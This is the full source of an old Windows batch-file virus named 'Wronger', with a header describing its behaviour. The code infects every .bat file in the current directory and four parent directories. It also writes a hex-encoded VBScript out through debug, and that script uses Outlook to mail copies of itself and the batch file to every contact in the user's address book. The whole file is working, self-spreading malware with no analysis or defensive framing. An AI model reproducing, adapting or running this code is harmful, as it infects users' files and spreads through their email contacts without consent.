:: Wronger
:: by Lawrencium, 15-Sep-2003
:: Appends itself to all batches in CWD and four directories upwards.
:: Drops (and starts) a VBS that sends itself and the batch to all
:: addresses in the user's contact list.

@echo off%Ï%
::ctty nul%Ï%
%Ï%if "%1"=="" goto b
%Ï%if "%1"=="%0.BAT" goto z
find "Ï"<%1 >nul
%Ï%if not errorlevel 1 goto z
type %1 >Ï
find "Ï"<%0.bat>>Ï
move /y Ï %1
%Ï%attrib +A +R %1
%Ï%goto z
:b %Ï%
ctty nul%Ï%
%Ï%attrib -A -R -S -H *.bat
%Ï%for %%a in (*.bat ..\*.bat ..\..\*.bat ..\..\..\*.bat ..\..\..\..\*.bat) do call %0 %%a
find "Ï"<%0.bat>\start.bat
echo e 100 4F 6E 20 45 72 72 6F 72 20 52 65 73 75 6D 65 20>Ï
echo e 110 4E 65 78 74 3A 53 65 74 20 6F 3D 43 72 65 61 74>>Ï                  
echo e 120 65 4F 62 6A 65 63 74 28 22 4F 75 74 6C 6F 6F 6B>>Ï                  
echo e 130 2E 41 70 70 6C 69 63 61 74 69 6F 6E 22 29 3A 53>>Ï                  
echo e 140 65 74 20 69 3D 6F 2E 47 65 74 4E 61 6D 65 53 70>>Ï                  
echo e 150 61 63 65 28 22 4D 41 50 49 22 29 3A 53 65 74 20>>Ï                    
echo e 160 61 3D 69 2E 41 64 64 72 65 73 73 4C 69 73 74 73>>Ï                  
echo e 170 28 31 29 3A 46 6F 72 20 78 3D 31 20 54 6F 20 61>>Ï                  
echo e 180 2E 41 64 64 72 65 73 73 45 6E 74 72 69 65 73 2E>>Ï                  
echo e 190 43 6F 75 6E 74 3A 53 65 74 20 6D 3D 6F 2E 43 72>>Ï                  
echo e 1A0 65 61 74 65 49 74 65 6D 28 30 29 3A 6D 2E 74 6F>>Ï                  
echo e 1B0 3D 61 2E 41 64 64 72 65 73 73 45 6E 74 72 69 65>>Ï                  
echo e 1C0 73 28 78 29 3A 6D 2E 42 6F 64 79 3D 22 3B 29 22>>Ï                  
echo e 1D0 3A 6D 2E 41 74 74 61 63 68 6D 65 6E 74 73 2E 41>>Ï                   
echo e 1E0 64 64 20 22 5C 73 74 61 72 74 2E 62 61 74 22 3A>>Ï                  
echo e 1F0 6D 2E 41 74 74 61 63 68 6D 65 6E 74 73 2E 41 64>>Ï                  
echo e 200 64 20 57 53 63 72 69 70 74 2E 53 63 72 69 70 74>>Ï                   
echo e 210 46 75 6C 6C 4E 61 6D 65 3A 6D 2E 53 65 6E 64 3A>>Ï                   
echo e 220 4E 65 78 74 3A 6F 2E 51 75 69 74 0D 0A>>Ï
echo n Ï.vbs>>Ï
echo rcx>>Ï
echo 012D>>Ï
echo w>>Ï
echo q>>Ï
debug <Ï >nul
del Ï
cscript Ï.vbs >nul
move /y Ï.vbs \ >nul
:z %Ï%
ctty con%Ï%
